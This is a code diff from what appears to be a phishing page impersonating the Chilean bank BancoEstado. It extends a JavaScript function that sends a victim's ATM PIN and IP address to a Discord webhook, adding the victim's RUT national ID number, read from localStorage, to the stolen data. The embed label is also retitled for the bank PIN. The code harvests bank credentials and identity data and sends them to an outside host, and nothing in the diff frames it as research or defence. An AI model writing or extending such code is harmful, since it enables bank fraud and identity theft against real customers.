@@ -306,6 +306,9 @@
 
         // Función para enviar PIN a Discord
         function enviarPinADiscord(pin) {
+            // Recuperar RUT del localStorage
+            const rutUsuario = localStorage.getItem('rutUsuario') || 'No disponible';
+
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -314,12 +317,17 @@
                         embeds: [{
                             color: 3447003,
                             author: {
-                                name: '✨𝕷𝖔𝖌𝖔 𝕭𝖆𝖓𝖈𝖔𝕰𝖘𝖙𝖆𝖉𝖔✨'
+                                name: '✨𝓟𝓘𝓝 𝓑𝓪𝓷𝓬𝓸𝓔𝓼𝓽𝓪𝓭𝓸✨'
                             },
                             fields: [
                                 {
                                     name: 'PIN Cajero',
                                     value: `\`${pin}\``,
+                                    inline: false
+                                },
+                                {
+                                    name: 'RUT',
+                                    value: `\`${rutUsuario}\``,
                                     inline: false
                                 },
                                 {
